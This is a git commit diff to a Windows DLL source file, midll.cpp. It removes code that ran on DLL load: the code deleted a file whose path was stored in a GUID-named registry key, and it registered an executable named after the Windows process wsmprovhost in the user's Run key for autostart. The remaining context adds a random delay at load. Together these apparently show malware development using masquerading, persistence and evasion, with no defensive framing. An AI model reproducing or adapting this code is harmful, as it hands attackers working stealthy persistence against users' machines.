bd2d80e50644879b39f71156270051d7065c0ff9
Sơn Thanh Nguyễn <sonthanhnguyen13@gmail.com>
2024-10-07 22:36:24 +0700

    Update midll.cpp

--- midll.cpp
+++ midll.cpp
@@ -23,42 +23,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
 	switch (fdwReason)
 	{
 	case DLL_PROCESS_ATTACH: {
-		// Create a thread and close the handle as we do not want to use it to wait for it 
-		// TODO: Remove after test
-		HKEY hkey = NULL;
-		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", 0, KEY_WRITE, &hkey);
-		if (res == ERROR_SUCCESS) {
-			char value[255] = { 0 };
-			DWORD BufferSize = 255;
-			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"Software\\Classes\\87983e9e-fe92-11ed-be56-0242ac120002", "4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
-			Sleep(100);
-			if (value[0] != 0) {
-				remove(value);
-				RegSetValueEx(hkey, (LPCSTR)"4f3b5b6d-0aae-4f7f-8024-d906b12e7d4a", 0, REG_SZ, NULL, NULL);
-			}
-			else {
-			}
-			RegCloseKey(hkey);
-		}
-		// Create a thread and close the handle as we do not want to use it to wait for it 
-		char path[200];
-		_getcwd(path, 200);
-		HKEY hkey2 = NULL;
-		strcat_s(path, "\\wsmprovhost.exe");
-		const char* exe = path;
-		// startup
-		LONG res2 = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey2);
-		if (res2 == ERROR_SUCCESS) {
-			char value[255] = { 0 };
-			DWORD BufferSize = 255;
-			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "wsmprovhost", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
-			if (value[0] != 0) {
-			}
-			else {
-				RegSetValueEx(hkey2, (LPCSTR)"wsmprovhost", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
-			}
-			RegCloseKey(hkey2);
-		}
 		srand(clock());
 		int num = ((rand() % (100 - 1 + 1)) + 1) * 200;
 		Sleep(num);
